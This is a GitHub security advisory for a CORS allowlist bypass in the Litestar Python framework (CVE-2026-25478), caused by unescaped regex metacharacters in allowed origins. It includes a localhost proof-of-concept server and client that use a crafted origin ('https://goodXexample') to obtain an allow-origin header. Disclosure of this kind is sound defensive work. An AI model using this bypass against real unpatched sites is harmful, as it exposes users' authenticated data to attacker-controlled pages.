# [H] Litestar's CORS origin allowlist has a bypass due to unescaped regex metacharacters in allowed origins

## Summary
Severity: High
Advisory: GHSA-2p2x-hpg8-cqp2
CVE: CVE-2026-25478
CWE: CWE-942
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-02-09
Source: https://github.com/advisories/GHSA-2p2x-hpg8-cqp2
Type: github-advisory

## Affected
- PyPI: `litestar` — affected >=2.19.0 <2.20.0

## Details
### Summary
CORS origin validation can be bypassed because the allowed-origins allowlist is compiled into a regex without escaping metacharacters (notably .). An allowed origin like https://good.example can match https://goodXexample, resulting in Access-Control-Allow-Origin being set for an untrusted origin

### Details
CORSConfig.allowed_origins_regex is constructed using a regex built from configured allowlist values and used with fullmatch() for validation. Because metacharacters are not escaped, a malicious origin can match unexpectedly. The check relies on allowed_origins_regex.fullmatch(origin).

### PoC
Server (poc_cors_server.py)

```
from litestar import Litestar, get
from litestar.config.cors import CORSConfig

@get("/c")
async def c() -> str:
    return "ok"

cors = CORSConfig(
    allow_origins=["https://good.example"],
    allow_credentials=True,
)
app = Litestar([c], cors_config=cors)
```

`uvicorn poc_cors_server:app --host 127.0.0.1 --port 8002`

Client (poc_cors_client.py)

```
import http.client

def req(origin: str) -> tuple[int, str | None]:
    c = http.client.HTTPConnection("127.0.0.1", 8002, timeout=3)
    c.request("GET", "/c", headers={"Origin": origin, "Host": "example.com"})
    r = c.getresponse()
    r.read()
    acao = r.getheader("Access-Control-Allow-Origin")
    c.close()
    return r.status, acao

print("evil:", req("https://evil.example"))
print("bypass:", req("https://goodXexample")) 
```

Expected (vulnerable behavior):

Origin: https://evil.example → no ACAO
Origin: https://goodXexample → ACAO: https://goodxexample/ (bypass)

### Impact
Type: CORS policy bypass (cross-origin data exposure risk)
Who is impacted: apps using CORS allowlists to restrict browser cross-origin reads. If allow_credentials=True and authenticated endpoints return sensitive data, an attacker-controlled site can potentially read responses in a victim’s browser session.

## References
- https://github.com/litestar-org/litestar/security/advisories/GHSA-2p2x-hpg8-cqp2
- https://nvd.nist.gov/vuln/detail/CVE-2026-25478
- https://github.com/litestar-org/litestar/commit/eb87703b309efcc0d1b087dcb12784e76b003d5a
- https://docs.litestar.dev/2/release-notes/changelog.html#2.20.0
- https://github.com/litestar-org/litestar
- https://github.com/litestar-org/litestar/releases/tag/v2.20.0
